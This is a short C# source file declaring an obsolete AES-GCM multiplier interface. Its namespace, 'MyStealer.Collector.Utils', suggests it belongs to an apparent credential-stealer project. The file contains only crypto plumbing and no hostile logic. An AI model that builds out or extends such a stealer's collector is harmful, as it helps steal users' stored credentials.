using System;

namespace MyStealer.Collector.Utils.BcAesGcm
{
    [Obsolete("Will be removed")]
    public interface IGcmMultiplier
    {
        void Init(byte[] H);
        void MultiplyH(byte[] x);
    }
}
